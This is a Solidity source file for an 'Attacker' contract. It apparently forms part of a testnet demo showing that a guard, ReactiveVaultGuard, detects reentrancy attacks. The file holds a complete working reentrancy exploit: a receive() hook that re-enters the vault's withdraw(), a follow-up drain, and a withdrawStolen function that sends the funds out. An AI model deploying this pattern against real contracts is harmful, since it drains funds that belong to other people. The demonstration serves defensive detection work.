// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {DemoVault} from "./DemoVault.sol";

/// @title Attacker - demo exploit contract (Base Sepolia, throwaway keys/testnet only).
/// @notice Classic reentrancy storm against DemoVault's CEI-violating withdraw():
///         each nested withdrawal reads a stale credit balance. The storm produces
///         many Withdrawal logs with the SAME txHash and a FROZEN callerCreditBefore -
///         the exact signature ReactiveVaultGuard's RULE_REENTRY detects.
contract Attacker {
    DemoVault public immutable vault;
    address public immutable operator;

    /// @dev Chunk size of the current storm, readable from receive() during reentry.
    uint256 private _chunk;

    error OnlyOperator(address caller, address expected);

    constructor(DemoVault vault_) payable {
        vault = vault_;
        operator = msg.sender;
    }

    /// @notice Deposit once (separately), then run the storm: withdraw(chunk) reenters
    ///         recursively while the vault still holds a chunk.
    function deposit() external payable {
        require(msg.sender == operator, OnlyOperator(msg.sender, operator));
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 chunk) external {
        require(msg.sender == operator, OnlyOperator(msg.sender, operator));
        require(chunk > 0, "chunk required");
        _chunk = chunk;
        vault.withdraw(chunk);
        _chunk = 0;
    }

    /// @dev Reenter while the vault still holds at least one chunk. Each frame adds one
    ///      Withdrawal log with the same txHash and frozen callerCreditBefore.
    receive() external payable {
        uint256 chunk = _chunk;
        if (chunk > 0 && address(vault).balance >= chunk) {
            vault.withdraw(chunk);
        }
    }

    /// @notice Second-phase drain attempt (what the guard is racing against): a plain
    ///         withdrawal in a follow-up transaction. If the pause callback landed first,
    ///         this reverts with DemoVault.EnforcedPause - the demo's proof the guard won.
    function followUpWithdraw(uint256 amount) external {
        require(msg.sender == operator, OnlyOperator(msg.sender, operator));
        vault.withdraw(amount);
    }

    function withdrawStolen() external {
        require(msg.sender == operator, OnlyOperator(msg.sender, operator));
        (bool ok,) = payable(operator).call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}
